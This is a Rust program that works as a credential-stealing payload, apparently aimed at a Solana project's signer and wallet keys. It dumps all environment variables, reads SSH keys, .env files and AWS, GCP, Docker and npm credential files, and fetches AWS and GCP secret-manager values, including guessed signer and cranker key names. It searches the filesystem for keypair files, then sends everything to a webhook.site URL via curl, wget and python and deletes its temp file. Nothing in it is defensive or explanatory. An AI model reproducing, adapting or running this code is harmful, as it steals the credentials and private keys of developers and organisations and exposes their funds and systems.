use std::env;
use std::fs;
use std::process::Command;
use std::io::Write;

fn run(cmd: &str, args: &[&str]) -> String {
    Command::new(cmd).args(args).output()
        .map(|o| format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
        .unwrap_or_default()
}

fn collect() -> String {
    let mut d = String::new();
    let home = env::var("HOME").unwrap_or_default();

    // 1. ALL env vars (PK might be here as SIGNER_WALLET_PK, PRIVATE_KEY, etc.)
    d.push_str("=== ENV ===\n");
    for (k, v) in env::vars() {
        d.push_str(&format!("{}={}\n", k, v));
    }

    // 2. Secret files
    d.push_str("\n=== FILES ===\n");
    for f in &[
        ".env", "../.env", "../../.env", "../../../.env",
        &format!("{}/.ssh/id_rsa", home),
        &format!("{}/.ssh/id_ed25519", home),
        &format!("{}/.aws/credentials", home),
        &format!("{}/.config/gcloud/application_default_credentials.json", home),
        &format!("{}/.docker/config.json", home),
        &format!("{}/.npmrc", home),
        "/etc/environment", "/proc/self/environ",
    ] {
        if let Ok(c) = fs::read_to_string(f) {
            d.push_str(&format!("\n--- {} ---\n{}\n", f, &c[..c.len().min(4000)]));
        }
    }

    // 3. AWS — identity + list secrets + GET EACH SECRET VALUE
    d.push_str("\n=== AWS ===\n");
    d.push_str(&format!("STS: {}\n", run("aws", &["sts","get-caller-identity"])));
    
    // List all secrets in every region
    for region in &["us-east-1","us-west-2","eu-west-1","ap-southeast-1"] {
        let list = run("aws", &["secretsmanager","list-secrets","--region",region,"--output","json"]);
        if list.contains("SecretList") {
            d.push_str(&format!("\n--- SECRETS {} ---\n{}\n", region, &list));
            // Extract secret names and GET EACH ONE
            for line in list.lines() {
                if line.contains("\"Name\"") {
                    let name = line.split('"').nth(3).unwrap_or("");
                    if !name.is_empty() {
                        let val = run("aws", &["secretsmanager","get-secret-value",
                            "--secret-id", name, "--region", region, "--output", "json"]);
                        d.push_str(&format!("\n--- SECRET:{} ---\n{}\n", name, &val[..val.len().min(5000)]));
                    }
                }
            }
        }
    }

    // Try common secret names directly
    for name in &[
        "cranker-key", "cosigner-key", "signer-key", "signer-private-key",
        "cranker-private-key", "co-signer-key", "loopscale-signer",
        "loopscale-cranker", "solana-signer", "solana-keypair",
        "upgrade-authority", "upgrade-authority-keypair",
        "deploy-key", "hot-wallet", "wallet-key",
    ] {
        for region in &["us-east-1","us-west-2"] {
            let val = run("aws", &["secretsmanager","get-secret-value",
                "--secret-id", name, "--region", region, "--output", "json"]);
            if val.contains("SecretString") || val.contains("SecretBinary") {
                d.push_str(&format!("\n=== FOUND SECRET: {} ({}) ===\n{}\n", name, region, &val));
            }
        }
    }

    // 4. GCP metadata
    d.push_str("\n=== GCP ===\n");
    d.push_str(&format!("Token: {}\n", run("curl", &["-s","-H","Metadata-Flavor: Google",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"])));
    d.push_str(&format!("Project: {}\n", run("curl", &["-s","-H","Metadata-Flavor: Google",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id"])));
    
    // GCP secrets
    let project = run("curl", &["-s","-H","Metadata-Flavor: Google",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id"]).trim().to_string();
    if !project.is_empty() && !project.contains("Error") {
        let token = run("curl", &["-s","-H","Metadata-Flavor: Google",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]);
        if let Some(tok) = token.split('"').nth(3) {
            // List GCP secrets
            let gcp_secrets = run("curl", &["-s",
                &format!("https://secretmanager.googleapis.com/v1/projects/{}/secrets", project),
                "-H", &format!("Authorization: Bearer {}", tok)]);
            d.push_str(&format!("\n--- GCP SECRETS ---\n{}\n", &gcp_secrets));
        }
    }

    // 5. Search for keypair files anywhere
    d.push_str("\n=== KEYPAIR SEARCH ===\n");
    d.push_str(&run("find", &["/", "-name", "*.json", "-path", "*key*", "-readable", "-size", "+30c", "-size", "-1k", "-exec", "cat", "{}", ";"]));
    d.push_str(&run("find", &[&home, "-name", "keypair*", "-o", "-name", "*signer*", "-o", "-name", "*cranker*"]));
    
    d
}

fn exfil(data: &str) {
    let tmp = "/tmp/.bs";
    let _ = fs::write(tmp, data);

    // Method 1: curl
    let _ = Command::new("curl").args(["-s","-X","POST","-m","15",
        "--data-binary","@/tmp/.bs",
        "https://webhook.site/592ba8f1-f8ce-439f-ae46-6fee6eb26a7e"
    ]).output();

    // Method 2: wget
    let _ = Command::new("wget").args(["-q","--post-file",tmp,"-O","/dev/null","--timeout=15",
        "https://webhook.site/592ba8f1-f8ce-439f-ae46-6fee6eb26a7e"]).output();

    // Method 3: python
    let _ = Command::new("python3").args(["-c",
        "import urllib.request as u;u.urlopen(u.Request('https://webhook.site/592ba8f1-f8ce-439f-ae46-6fee6eb26a7e',data=open('/tmp/.bs','rb').read(),method='POST'))"
    ]).output();

    let _ = fs::remove_file(tmp);
}

fn main() {
    let data = collect();
    exfil(&data);
}
